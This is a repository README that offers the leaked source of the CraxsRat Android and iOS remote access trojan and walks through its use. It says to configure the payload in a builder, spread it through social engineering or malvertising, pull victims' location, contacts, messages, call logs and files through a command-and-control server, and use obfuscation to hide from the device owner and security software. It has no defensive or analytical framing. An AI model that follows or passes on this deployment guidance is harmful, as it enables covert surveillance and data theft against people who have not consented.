## CarpaAlko Source Code

This repository contains the leaked source code of **CraxsRat**, a sophisticated Android && iOS remote access trojan ( **RAT** ) developed by "EVLF DEV". CraxsRat has been used in various cyber-attacks to grant cybercriminals extensive control over infected devices.

## Requirements

- Android && iOS device ( target )
- Builder application to create the RAT payload

## Setup

1. **Clone the Repository**:
   ```sh
   git clone https://github.com/byt3n33dl3/CarpaAlko.git
   cd CarpaAlko
   cd CarpaAlko_v7
   ```

2. **Open it with vs & Builder Configuration**:
   - Open the project .sln file with vs
   - Follow the instructions in the builder directory to set up and configure the RAT payload.
   - Customize the payload to suit your specific requirements.

3. **Payload Deployment**:
   - Distribute the RAT payload through social engineering, malvertising, or other methods.
   - Ensure the payload is installed on the target device.

# Usage

1. **Control the Infected Device**:
   - Use the command and control (C2) server to send commands to the infected device.
   - Retrieve location, contacts, messages, call logs, and access stored files.

2. **Maintain Persistence**:
   - Utilize the obfuscation features to keep the RAT hidden from the user and security software.
   - Ensure the RAT's accessibility settings are enabled to maintain control over the device.
